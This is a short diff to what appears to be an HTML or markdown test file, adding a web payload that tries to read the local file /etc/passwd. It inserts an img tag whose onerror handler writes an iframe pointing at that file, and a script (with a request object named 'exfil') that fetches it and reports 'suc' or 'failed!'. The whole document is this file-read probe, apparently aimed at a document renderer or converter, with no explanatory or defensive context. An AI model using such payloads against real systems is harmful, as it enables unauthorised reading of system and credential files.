@@ -1,5 +1,11 @@
 fooasd
 
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+
 <script>
-    document.write('failed!');
+    exfil = new XMLHttpRequest();
+    exfil.open("GET","file:///etc/passwd");
+    exfil.send();
+    exfil.onload = function(){document.write('suc');}
+    exfil.onerror = function(){document.write('failed!')}
 </script>
